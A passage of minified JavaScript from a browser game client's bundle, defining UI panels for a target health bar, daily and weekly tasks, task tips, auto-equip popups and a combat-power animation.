this.update()):(egret.Tween.removeTweens(this.eGrayImg),void(this.visible=!1))},e.prototype.updateBloodBar=function(){r.TargetPanelCC.hpMax&&(this.visible=r.TargetPanelCC.checkIsShow(l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.targetHandle)),this.eBloodBar.maximum=r.TargetPanelCC.hpMax,this.eBloodBar.value=Math.min(r.TargetPanelCC.hp,r.TargetPanelCC.hpMax),this.curValue=Math.floor(this.eBloodBar.value/r.TargetPanelCC.hpMax*100),this.tweenBlood())},e.prototype.tweenBlood=function(){var t=this,i=Math.max(this.curValue*e.GRAYIMG_WIDTH/100,0);if(egret.Tween.removeTweens(this.eGrayImg),!(1>i&&this.eGrayImg.width<1)){var n=egret.Tween.get(this.eGrayImg),o=1>i?500:1;n.to({width:i},1e3).wait(o).call(function(){0>=i&&(egret.Tween.removeTweens(t.eGrayImg),t.visible=!1)})}},e.prototype.updateBaseInfo=function(){r.TargetPanelCC.monsterID>0?this.monsterInfo():this.updateInfo()},e.prototype.monsterInfo=function(){var t=s.GlobalConfig.MonstersConfig[r.TargetPanelCC.monsterID];if(t){var e,i=e?e+"层守将·":"";this.eNameLab.textFlow=n.TextFlowMaker.generateTextFlow1(""+i+t.name+"("+gettext("{0}级",t.level)+")"),this.eHead.source="monhead"+t.head+"_png"}},e.prototype.updateInfo=function(){var t=l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.targetHandle);if(t&&t.infoModel&&(t.infoModel.type==EntityType.Role||t.infoModel.type==EntityType.LadderPlayer)){var e=t.infoModel;this.eNameLab.textFlow=n.TextFlowMaker.generateTextFlow1(e.getNameWithServer2()),this.eHead.source="yuanhead"+e.job+e.sex}else this.eNameLab.textFlow=null,this.eHead.source=""},e.prototype.updateBelong=function(){var t=d.CommonUtils.getObjectByAttr(s.GlobalConfig.CityFbBossConfig,"fbId",u.GameMap.fubenID),e=null===t||void 0===t?void 0:t.TypeId;if(1==e||u.GameMap.fbType==p.FbCT.FB_TYPE_9)return this.eBelongGrp.visible=!1,void(this.efightbtn.visible=!1);this.visible=r.TargetPanelCC.checkIsShow(l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.targetHandle)),this.eBelongGrp.visible=r.TargetPanelCC.belongHandle>0,this.eBelongBtn.visible=r.TargetPanelCC.belongHandle!=a.ActorCC.handle;var i;if(i=u.GameMap.checkIsInDevildomBoss()?y.BossCT.ins().getBelongName():r.TargetPanelCC.belongName,this.eBelongTips.textFlow=n.TextFlowMaker.generateTextFlow(""+(i||gettext("无"))),i&&""!=i){var o=this.showEfightBtn(i);return void(this.efightbtn.visible=o)}this.efightbtn.visible=!1},e.prototype.updateCamp=function(t){var e;if(e=u.GameMap.checkIsInDevildomBoss()?y.BossCT.ins().getBelongName():r.TargetPanelCC.belongName,e&&""!=e){var i=this.showEfightBtn(e);return void(this.efightbtn.visible=i)}this.efightbtn.visible=!1},e.prototype.updateList2=function(t){this.teamList=t},e.prototype.showEfightBtn=function(t){var e,i,n,o=u.GameMap.fubenID;s.GlobalConfig.InstanceConfig[o];if(c.CampCC.mode==c.CampMode.PWACE||t==a.ActorCC.myName)return!1;if(c.CampCC.mode==c.CampMode.TEAM){if(u.GameMap.checkIsInShiKongZhiJing()){var h=l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.belongHandle),p=null===(e=null===h||void 0===h?void 0:h.infoModel)||void 0===e?void 0:e.camp;return m.BurningDesertCT.ins().checkIsFriend(p)}if(u.GameMap.checkIsInInvade()){var h=l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.belongHandle),p=null===(i=null===h||void 0===h?void 0:h.infoModel)||void 0===i?void 0:i.camp;return C.InvadeCT.ins().checkIsFriend(p)}if(u.GameMap.checkIsInStardomain()){var h=l.EntityManager.ins().getEntityByHandle(r.TargetPanelCC.belongHandle),p=null===(n=null===h||void 0===h?void 0:h.infoModel)||void 0===n?void 0:n.camp;
return T.StardomainCT.ins().checkIsFriend(p)}for(var d=this.teamList,f=0;f<d.length;f++)if(t==d[f].name)return!1}if(c.CampCC.mode==c.CampMode.GUILD)for(var v=g.Guild.ins().getGuildMembers(0),f=0;f<v.length;f++)if(t==v[f].name)return!1;return!0},e.GRAYIMG_WIDTH=0,__decorate([delayCall()],e.prototype,"targetChange",null),__decorate([delayCall(100)],e.prototype,"updateBloodBar",null),e}(o.BaseView);e.TargetBloodPanel=b,window.TargetBloodPanel=b,__reflect(b.prototype,"TargetBloodPanel",[]),window.TargetBloodPanel=b},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DayAndWeekTaskWin=void 0;var n=i(1),o=i(17),s=i(0),a=i(513),r=i(35),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DayAndWeekTaskSkin",e.gifts=[],e.giftsIcon=[],e.giftRed=[],e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.btnClose,this.onClick),this.addChangeEvent(this.ItemTab,this.onTab),this.gifts=[this.gift1,this.gift2,this.gift3,this.gift4],this.giftsIcon=["giftIcon1","giftIcon2","giftIcon3","giftIcon4"],this.giftRed=[this.giftRed1,this.giftRed2,this.giftRed3,this.giftRed4],this.lstTask.itemRenderer=a.ItemDayAndWeekTaskRender,this.barActivity._direction=eui.Direction.LTR,getLangType()==LanguageEnum.AR&&(this.txtValue.text="100              75             50           25")},e.prototype.redRefresh=function(){if(this.ItemTab.numElements&&this.ItemTab.getElementAt(0)){var t=this.ItemTab.getElementAt(0);t.eRp&&(t.eRp.visible=r.TaskCT.ins().dayTaskRed.v);var e=this.ItemTab.getElementAt(1);e.eRp&&(e.eRp.visible=r.TaskCT.ins().weekTaskRed.v)}},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.ItemTab.selectedIndex=0;for(var i=0;i<this.gifts.length;i++){var n=this.gifts[i];n.name=""+(i+1),this.addTouchEvent(n,this.onGift)}observe(this,this.updateView,r.TaskCT.ins().postTaskChangeData),observe(this,this.updateView,r.TaskCT.ins().postWeekTaskChangeData),observe(this,this.redRefresh,o.RedPointBaseSys.ins().RpChange),this.updateView(),this.redRefresh()},e.prototype.removeDisplay=function(){},e.prototype.onClick=function(t){switch(t.currentTarget){case this.btnClose:win.close("DayAndWeekTaskWin")}},e.prototype.onGift=function(t){var e=t.currentTarget;if(e instanceof eui.Group)if(0==this.ItemTab.selectedIndex){var i=s.GlobalConfig.DailyAwardConfig[e.name];if(r.TaskCT.ins().vitality>=i.valueLimit){var n=r.TaskCT.ins().getVitalityAwardsById(Number(e.name),this.ItemTab.selectedIndex);0==n.state&&r.TaskCT.ins().sendGetVitalityAwards(parseInt(e.name))}else win.open("DayAndWeekTipWin",this.ItemTab.selectedIndex,e.name)}else{var i=s.GlobalConfig.WeekAwardConfig[e.name];if(r.TaskCT.ins().weekVitality>=i.valueLimit){var n=r.TaskCT.ins().getVitalityAwardsById(Number(e.name),this.ItemTab.selectedIndex);0==n.state&&r.TaskCT.ins().sendGetdWeekVitalityAwards(parseInt(e.name))}else win.open("DayAndWeekTipWin",this.ItemTab.selectedIndex,e.name)}},e.prototype.onTab=function(){this.updateView()},e.prototype.updateView=function(){var t=0==this.ItemTab.selectedIndex?s.GlobalConfig.DailyConfig:s.GlobalConfig.WeekConfig,e=0==this.ItemTab.selectedIndex?s.GlobalConfig.DailyAwardConfig:s.GlobalConfig.WeekAwardConfig,i=[];for(var n in t){var o=t[n],a=r.TaskCT.ins().getTaskDataById(o.id,this.ItemTab.selectedIndex),l=1==a.state?1e3:0==a.state?1e4:1e5,h={index:this.ItemTab.selectedIndex,id:o.id,taskName:o.name,desc:o.desc,target:o.target,value:a?a.value:0,state:a?a.state:0,item:o.awardList[0],order:o.id+l,control:o.control,controlTarget:o.controlTarget};i.push(h)}i.sort(function(t,e){return t.order-e.order}),this.lstTask.dataProvider=new eui.ArrayCollection(i);var u=0==this.ItemTab.selectedIndex?r.TaskCT.ins().vitality:r.TaskCT.ins().weekVitality,p=r.TaskCT.ins().getMaxActivity(this.ItemTab.selectedIndex);this.barActivity.maximum=p,this.barActivity.value=u>p?p:u,this.exActive.text=""+u;var d=0;for(var n in e){var c=e[n];c&&(this.gifts[d].x=this.barActivity.x+c.valueLimit/p*this.barActivity.width-this.gifts[d].width/2,d++)}for(var f=0;f<this.gifts.length;f++){var g=this.giftRed[f],m=this.giftsIcon[f],h=0==this.ItemTab.selectedIndex?r.TaskCT.ins().vitalityAwards[f]:r.TaskCT.ins().weekVitalityAwards[f],v=0==this.ItemTab.selectedIndex?r.TaskCT.ins().vitality:r.TaskCT.ins().weekVitality,y=v>p?p:v,C=e[f+1].valueLimit;g.visible=1!=h.state&&y>=C,this[m].source=1!=h.state?"richang_dbx":"richang_dbx1"}},__decorate([delayCall(100)],e.prototype,"redRefresh",null),e}(n.BaseView);e.DayAndWeekTaskWin=l,window.DayAndWeekTaskWin=l,__reflect(l.prototype,"DayAndWeekTaskWin",[]),window.DayAndWeekTaskWin=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DayAndWeekTipWin=void 0;var n=i(1),o=i(11),s=i(0),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DayAndWeekTipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstReward.itemRenderer=o.ItemBase,this.addTouchEndEvent(this.sureBtn,this.onClose)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=t[0],n=0==i?s.GlobalConfig.DailyAwardConfig:s.GlobalConfig.WeekAwardConfig,o=t[1],a=n[o];this.lstReward.dataProvider=new eui.ArrayCollection(a.awardList)},e.prototype.onClose=function(){win.close("DayAndWeekTipWin")},e}(n.BaseView);e.DayAndWeekTipWin=a,window.DayAndWeekTipWin=a,__reflect(a.prototype,"DayAndWeekTipWin",[]),window.DayAndWeekTipWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ExperienceWin=void 0;var n=i(1),o=i(514),s=i(35),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ExperienceSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.lstChapter.itemRenderer=o.ItemExperienceRender,this.lstChapter.dataProvider=this.sData=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateAchieve,s.TaskCT.ins().postUpdateAchieve),observe(this,this.updateAchieve,s.TaskCT.ins().viewShowChapter),this.addTouchEvent(this.closeBtn,this.onClick),this.updateAchieve()},e.prototype.removeDisplay=function(){},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:win.close(this)}},e.prototype.updateAchieve=function(t){void 0===t&&(t=this.lstChapter.selectedIndex);for(var e=s.TaskCT.ins().getAllExAchievementType(),i=[],n=0;n<e.length;n++){var o=e[n],a=s.TaskCT.ins().isExOpen(o)?1:0,r=t==n?1:0,l={type:e[n],open:a,show:r};i.push(l)}this.sData.replaceAll(i)},e}(n.BaseView);e.ExperienceWin=a,window.ExperienceWin=a,__reflect(a.prototype,"ExperienceWin",[]),window.ExperienceWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TaskTips=void 0;var n=i(1),o=i(516),s=i(35),a=i(20),r=i(0),l=i(27),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="tasktipsskin",e.oldW=0,e.defaultRect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.listDP=new eui.ArrayCollection,this.eList.dataProvider=this.listDP,this.eList.itemRenderer=o.TaskTipsRenderer,this.listDP.replaceAll(s.TaskCT.ins().getTaskList()),this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){observe(this,this.updateList,s.TaskCT.ins().postUpdateAchieve),observe(this,this.updateList,s.TaskCT.ins().postTaskChangeData),observe(this,this.updateList,s.TaskCT.ins().postUpdteTaskTrace),observe(this,this.updateQuitBtn,Ts.enterScene),this.initView()},e.prototype.initView=function(){this.updateQuitBtn()},e.prototype.updateList=function(){this.listDP.replaceAll(s.TaskCT.ins().getTaskList())},e.prototype.onClick=function(t){if(t.target instanceof o.TaskTipsRenderer){if(a.GameMap.checkIsKf())return;return void t.target.onBtnClick()}switch(t.target){case this.eQuit:l.WarnWin.show(gettext("是否离开当前场景？"),function(){send(Ts.exitFB)},this)}},e.prototype.iconEff=function(t){},e.prototype.updateQuitBtn=function(){var t=r.GlobalConfig.InstanceConfig[a.GameMap.fubenID];this.eQuit.visible=!!(null===t||void 0===t?void 0:t.canQuit)},__decorate([delayCall()],e.prototype,"initView",null),__decorate([delayCall(100)],e.prototype,"updateList",null),e}(n.BaseView);e.TaskTips=h,window.TaskTips=h,__reflect(h.prototype,"TaskTips",[]),window.TaskTips=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TasktipsTip=void 0;var n=i(1),o=i(11),s=i(13),a=i(64),r=i(35),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="tasktipsTipskin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=o.ItemBase,this.list.dataProvider=new eui.ArrayCollection([])},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.goBtn,this.OnClick),this.addTouchEvent(this.closeBtn,this.OnClick),observe(this,this.updateNum,r.TaskCT.ins().postUpdateAchieve),observe(this,this.updateNum,r.TaskCT.ins().postTaskChangeData),observe(this,this.updateNum,r.TaskCT.ins().postUpdteTaskTrace),this.updateView(),this.updateNum()},e.prototype.updateView=function(){var t=r.TaskCT.ins().taskTrace,e=r.TaskCT.ins().getAchieveConfById(t.id);if(e){for(var i=[],n=0;n<e.awardList.length;n++)e.awardList[n].job?s.SubRoles.ins().getSubRoleByIndex(0).job==e.awardList[n].job&&i.push(e.awardList[n]):i.push(e.awardList[n]);this.list.dataProvider=new eui.ArrayCollection(i),this.desLab.text=e.desc||"",this.titleTypeLab.text=2==e.showType?gettext("【主线】"):"",this.titleLab.text=e.name||""}},e.prototype.updateNum=function(){var t=r.TaskCT.ins().taskTrace,e=r.TaskCT.ins().getAchieveConfById(t.id);if(e){var i=e.target?"("+t.value+"/"+e.target+")":"";this.numLab.text=i}},e.prototype.OnClick=function(t){switch(t.target){case this.goBtn:var e=r.TaskCT.ins().getAchieveConfById(r.TaskCT.ins().taskTrace.id);e.targetmap?a.MainUICC.startGuide([e.targetmap]):e.guide&&this.goOpenView(e.guide);case this.closeBtn:win.close(this)}},e.prototype.goOpenView=function(t){for(var e=0;e<t.length;e++){var i=t[e];win.open(i[0],i[1],i[2])}},e}(n.BaseView);e.TasktipsTip=l,window.TasktipsTip=l,__reflect(l.prototype,"TasktipsTip",[]),window.TasktipsTip=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.LimitStartTipsView=void 0;var n=i(61),o=i(1),s=function(t){function e(){var e=t.call(this)||this;return e.defaultRect=!1,e._sn_="LimitStartTipsSkin",e.name=gettext("限时任务开始"),e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return n.LocationProperty.isTSServer?!1:!0},e.prototype.addDisplay=function(){this.addTouchEvent(this.btn,this.onStart)},e.prototype.onStart=function(){win.close("LimitStartTipsView"),win.open("LimitTaskView")},e}(o.BaseView);e.LimitStartTipsView=s,window.LimitStartTipsView=s,__reflect(s.prototype,"LimitStartTipsView",[]),window.LimitStartTipsView=s},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.TaskAlertWin=void 0;var n=i(179),o=i(1),s=i(11),a=i(1312),r=i(338),l=i(69),h=i(2),u=i(35),p=function(t){function e(){var e=t.call(this)||this;return e.CLOSE_TIME=5,e.timeCount=0,e._sn_="TaskSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.rewardList.itemRenderer=s.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.gotoBtn,this.onClick),this.setView(),l.SoundUtil.play("longlin_a_dkjm_mp3")},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];egret.Tween.removeTweens(this.arrowGroup)},e.prototype.setView=function(){var t=u.TaskCT.ins().taskTrace;if(t){var e=u.TaskCT.ins().getAchieveConfById(t.id),i=e.talk,n=i[0],o=i[1];switch(e&&(this.rewardList.dataProvider=new eui.ArrayCollection(e.awardList),this.taskInfo.text=o,this.eNpc.source=e.face||""),this.taskName.text=n,t.state){case 0:this.gotoBtn.label=gettext("前  往");break;case 1:this.gotoBtn.label=gettext("领  取")}}urlParam.noGuide&&(this.arrowGroup.visible=!1);var s=egret.Tween.get(this.arrowGroup,{loop:!0});s.to({y:this.arrowGroup.y-10},400).to({y:this.arrowGroup.y+10},400),Timer.stop(this.onTimeCount,this),this.timeCount=this.CLOSE_TIME,Timer.start(1e3,this.timeCount,this.onTimeCount,this),this.timeText.text=gettext("{0}秒后自动提交",this.timeCount)},e.prototype.onTimeCount=function(){this.timeCount--,this.timeText.text=gettext("{0}秒后自动提交",this.timeCount),0==this.timeCount&&(Timer.stop(this.onTimeCount,this),this.doTask())},e.prototype.onClick=function(t){switch(t.target){case this.gotoBtn:this.doTask()}},e.prototype.doTask=function(){var t=u.TaskCT.ins().taskTrace,e=u.TaskCT.ins().getAchieveConfById(t.id),i=e.pickmc,o=e.commc;0==t.state?(i&&l.SoundUtil.play(i),a.GameGuider.taskGuidance(t.id,1),n.GuideUtils.ins().updateByClick()):(o&&l.SoundUtil.play(o),u.TaskCT.ins().sendGetAchieve(t.achievementId),u.TaskCT.ins().postParabolicItem(),r.Hint.ins().postAchievementAft(t),u.TaskCT.ins().getAchieveConfById(t.id+1)||h.TipsCT.ins().showTips(gettext("已完成所有任务!"))),win.close("TaskAlertWin")},e}(o.BaseView);e.TaskAlertWin=p,window.TaskAlertWin=p,__reflect(p.prototype,"TaskAlertWin",[]),window.TaskAlertWin=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuideType=e.GameGuider=void 0;var n=i(50),o=i(35),s=i(32),a=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.taskGuidance=function(t,e){return __awaiter(this,void 0,void 0,function(){return __generator(this,function(t){return[2]})})},e.guidance=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];if("VipGiftWin"==t[0])win.open("VipGiftWin",t[1],t[2]);else{var i=-1!=t[1]?t[1]:null;win.open(t[0],i,t[2],t[3])}},e.challengeBoss=function(t){s.FbCT.ins().currentEnergy>=s.FbCT.ins().energy&&(t&&"function"==typeof t&&t(),s.FbCT.ins().autoPk())},e.startTaskEffect=function(){urlParam.noGuide},e.stopTaskEffect=function(){urlParam.noGuide},e.NPCAlert=function(t,e){if(void 0===e&&(e=1),1==e){var i=o.TaskCT.ins().taskTrace;if(i){var n=o.TaskCT.ins().getAchieveConfById(i.id);if(n&&n.control==r.taskAlert&&+n.controlTarget[3]==t.id&&n.talk)return win.open("TaskAlertWin"),!0}}if(!t)return!1;var s=t.win;return s?(win.open.apply(win,__spreadArrays([s[0]],s.slice(1))),!0):!1},e}(n.BaseClass);e.GameGuider=a,window.GameGuider=a,__reflect(a.prototype,"GameGuider",[]),window.GameGuider=a;var r;!function(t){t[t.OpenWin=1]="OpenWin",t[t.ChallengeBoss=2]="ChallengeBoss",t[t.ArtifactGuide=3]="ArtifactGuide",t[t.AtkMonster=4]="AtkMonster",t[t.AutoPk=5]="AutoPk",t[t.KillDeer=6]="KillDeer",t[t.GuideFb=7]="GuideFb",t[t.transfer=8]="transfer",t[t.taskAlert=9]="taskAlert"}(r=e.GuideType||(e.GuideType={})),window.GuideType=r,window.GuideType=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoEquipView=void 0;var n=i(517),o=i(0),s=i(1314),a=i(1),r=function(t){function e(){var e=t.call(this)||this;return e.defaultRect=!1,e.layoutNum=LayoutNum.top,e.goodEquipList=[],e.touchChildren=!0,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.showAutoEquipWin=function(t){var e=new s.AutoEquipWin;this.updateAutoEquipWin(e,t)},e.prototype.updateAutoEquipWin=function(t,e){var i=this;t.right=350,t.bottom=300,t.alpha=0,t.data=e,this.addChild(t),this.goodEquipList.unshift(t),t.addEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeGoodEquipTip,this),egret.Tween.removeTweens(t);var s=t instanceof n.TipsSkillAlertPanel,a=o.GlobalConfig.ClientGlobalConfig,r=s?a.skillShowTime:a.itemShowTime,l=(s?a.skillWaitTime:a.itemWaitTime,0),h=egret.Tween.get(t);h.wait(l).to({alpha:1,right:40},300).wait(r).to({right:40},8e3).wait(r).to({alpha:0,bottom:400},1e3).call(function(){i.removeChild(t)},this)},e.prototype.removeGoodEquipTip=function(t){var e=this.goodEquipList.indexOf(t.currentTarget);this.goodEquipList.splice(e,1),egret.Tween.removeTweens(t.currentTarget),t.currentTarget.removeEventListener(egret.Event.REMOVED_FROM_STAGE,this.removeGoodEquipTip,this),ObjectPool.push(t.currentTarget)},e}(a.BaseView);e.AutoEquipView=r,window.AutoEquipView=r,__reflect(r.prototype,"AutoEquipView",[]),window.AutoEquipView=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AutoEquipWin=void 0;var n=i(1),o=i(0),s=i(40),a=i(10),r=i(206),l=i(31),h=i(39),u=i(4),p=i(26),d=i(38),c=i(2),f=i(24),g=i(6),m=i(13),v=i(59),y=function(t){function e(){var e=t.call(this)||this;return e._sn_="AutoEquipSkin",e.TIME=8,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.closebtn,this.onTap),this.addTouchEvent(this.Autobtn,this.onClickOWearBtn),this.time1=this.TIME,this.Autotime.visible=!1,this.setData()},e.prototype.setData=function(){if(this.skin&&this.itemData){this.itemIconAuto.isShowName(!1);o.GlobalConfig.ClientGlobalConfig.getDesc;if(this.itemData instanceof s.ItemData){var t=this.itemData.quality;this.itemIconAuto.showNum(!0),this.itemIconAuto.data=this.itemData,this.quali.source="tips_"+t,this.powerLab.text=gettext("战力")+this.itemData.point+"",4==t?this.nameLabel.visible=!0:5==t&&(this.nameLabel.visible=!0),7==a.ItemUtil.getType(this.itemData.itemConfig),this.nameLabel.text=this.itemData.itemConfig.name,this.nameLabel.textColor=l.QUALITY_COLOR[t]}else if(this.itemData instanceof r.TreasureData){var e=o.GlobalConfig.SkirmishTreasureConfig[this.itemData.id];this.itemIconAuto.setItemImg(e.icon),this.itemIconAuto.setImgBg(e.quality),this.itemIconAuto.showNum(!1),this.itemIconAuto.showName=!0,this.itemIconAuto.setName(e.name),this.nameLabel.text=e.name,this.nameLabel.textColor=l.QUALITY_COLOR[e.quality]}else{var i=this.itemData;this.itemIconAuto.setItemImg(i.imgClose),this.nameLabel.text=i.name,this.nameLabel.textColor=l.QUALITY_COLOR[i.quality],this.itemIconAuto.showNum(!1)}this.Autotime.text=this.time1+gettext("秒后自动装备"),Timer.has(this.goodRewardTimer,this)||Timer.start(1e3,this.TIME,this.goodRewardTimer,this)}},e.prototype.goodRewardTimer=function(){this.time1--,this.time1<=0&&(this.time1=this.TIME,Timer.stop(this.goodRewardTimer,this))},e.prototype.onTap=function(t){switch(t.currentTarget){case this.closebtn:this.close()}},e.prototype.onClickOWearBtn=function(){return __awaiter(this,void 0,void 0,function(){var t,e,i,n,o,s,r,l,y,C,T,b,w;return __generator(this,function(I){switch(I.label){case 0:if(this.close(),t=this.itemData,!t)return[2];if(e=a.ItemUtil.getType(t.itemConfig),e!=h.ItemType.TYPE_0)return[3,2];if(i=u.ActorCC.level,n=p.ZsCT.ins().stage,o=t.itemConfig.level-d.EquipCT.ins().cutEquiplv(t)||0,t.itemConfig&&!(n>=(t.itemConfig.zsLevel||0)&&i>=o))return 5==this.itemData.quality?(c.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:{0}）达到{1}转{2}级可穿戴|",t.itemConfig.name,t.itemConfig.zsLevel,o)),n<t.itemConfig.zsLevel&&v.GameFlashSaleCt.ins().reportZsLvNot(),o>i&&v.GameFlashSaleCt.ins().reportLvNot(),[2]):(c.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:等级不足，无法穿戴|")),n<t.itemConfig.zsLevel&&v.GameFlashSaleCt.ins().reportZsLvNot(),o>i&&v.GameFlashSaleCt.ins().reportLvNot(),[2]);for(s=a.ItemUtil.getSubType(t.itemConfig),r=f.CommonUtils.copyDataHandler(a.ItemUtil.getPosList(t.itemConfig)||[]),-1==r.indexOf(s)&&r.push(s),l=m.SubRoles.ins().getSubRoleByIndex(0),y=[],C=0;C<r.length;C++){if(T=l.getEquipByIndex(r[C]),!T.item||!T.item.configID){s=r[C];break}b=g.BagCT.ins().getEquipAttrs(T.item),w=T.item.point?T.item.point:a.ItemUtil.getAttrPower(b),y.push(w)}return y.length>1&&(s=r[y.indexOf(Math.min.apply(Math,y))]),[4,sendSync(Ts.WearEquip,{handle:t.handle,pos:s,roleId:0})];case 1:return I.sent(),this.close(),[3,3];case 2:I.label=3;case 3:return[2]}})})},e.prototype.close=function(){Timer.stop(this.goodRewardTimer,this),this.parent&&this.parent.removeChild(this)},Object.defineProperty(e.prototype,"data",{set:function(t){this.itemData=t,this.setData()},enumerable:!1,configurable:!0}),e}(n.BaseView);e.AutoEquipWin=y,window.AutoEquipWin=y,__reflect(y.prototype,"AutoEquipWin",[]),window.AutoEquipWin=y},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BoostPowerView=void 0;var n=i(1),o=i(103),s=i(4),a=i(16),r=i(21),l=function(t){function e(){var e=t.call(this)||this;return e.defaultValue=0,e.defaultRect=!1,e.layoutNum=LayoutNum.top,e.touchEnabled=e.touchChildren=!1,e.y=o.StageUtils.ins().getHeight()/25,e.total=new eui.Group,e.total.bottom=280,e.addChild(e.total),e.total.horizontalCenter=-25,e.imgBg=new eui.Image,e.imgBg.source="zhandou_b_png",e.imgBg.x=50,e.imgBg.bottom=252,e.total.addChild(e.imgBg),e.imgBg.alpha=1,e.imgBg.touchEnabled=!1,e.eMc=new eui.Group,e.eMc.x=180,e.eMc.bottom=280,e.total.addChild(e.eMc),e.img=new eui.Image,e.img.source="jor_zdl_png",e.img.x=100,e.img.bottom=270,e.total.addChild(e.img),e.img.alpha=1,e.img.touchEnabled=!1,e.sp=new eui.Group,e.sp.x=200,e.sp.bottom=553,e.addChild(e.sp),e.lastTime=0,e.lastPower=0,e.clearShow(),e}return __extends(e,t),e.prototype.showBoostPower=function(t,e){this.defaultValue=e,0==this.lastPower&&(this.lastPower=e),Timer.start(500,1,this.delayPowerUp,this)},e.prototype.clearShow=function(){this.sp.removeChildren(),egret.Tween.removeTweens(this.img),this.img.visible=!1,egret.Tween.removeTweens(this.imgBg),this.imgBg.visible=!1,Timer.stopAll(this),egret.clearTimeout(this.ii),this.ii=0,a.DisplayUtils.removeFromParent(this.mc)},e.prototype.delayPowerUp=function(){var t=this.lastPower?this.lastPower:this.defaultValue,e=s.ActorCC.power;e>t&&this.showPowerUp(t,e)},e.prototype.showPowerUp=function(t,e){return __awaiter(this,void 0,void 0,function(){var i,n,o,l,h,u,p,d,c,f,g,m=this;return __generator(this,function(v){switch(v.label){case 0:return this.clearShow(),this.mc||(this.mc=new r.MovieClip),this.mc.playFile(RES_DIR_EFF+"PowerFire",-1),this.mc.parent||this.eMc.addChild(this.mc),this.img.visible=!0,this.img.alpha=1,this.imgBg.visible=!0,this.imgBg.alpha=1,i=new eui.BitmapLabel,i.letterSpacing=-5,i.font="num_8_fnt",i.x=this.total.x,i.bottom=4,this.sp.addChild(i),n=e-t,[4,Timer.start(20,25,function(){var e=n;e+=Math.round(Math.random()*e);var o=t.toString(),s="";s=e.toString().length==o.length?e.toString().slice(1):e+"",o=o.charAt(0),o+=s,i.text=o+""},this)];case 1:return v.sent(),i.text=s.ActorCC.power+"",o="+"+n,l=new eui.BitmapLabel,l.font="num_r0_fnt",l.letterSpacing=-5,l.text=o,l.x=i.x+i.width+10,l.y=i.y+30,l.bottom=2,this.sp.addChild(l),h=200,u=2e3,this.lastPower=0,p=egret.Tween.get(l),p.to({y:l.y-33},h).to({alpha:0},u).call(function(){a.DisplayUtils.removeFromParent(l)},this),d=egret.Tween.get(i),d.wait(h).to({alpha:0},u).call(function(){a.DisplayUtils.removeFromParent(i)},this),c=egret.Tween.get(this.img),c.wait(h).to({alpha:0},u).call(function(){m.img.visible=!1},this),f=egret.Tween.get(this.imgBg),f.wait(h).to({alpha:0},u).call(function(){m.imgBg.visible=!1},this),g=egret.Tween.get(this.eMc),g.wait(h).to({alpha:0},u).call(function(){a.DisplayUtils.removeFromParent(m.mc)},this),[2]}})})},e}(n.BaseView);e.BoostPowerView=l,window.BoostPowerView=l,__reflect(l.prototype,"BoostPowerView",[]),window.BoostPowerView=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShenFuEquipTipsWin=void 0;var n=i(5),o=i(1),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="ShenFuEquipTipsSkin",e}return 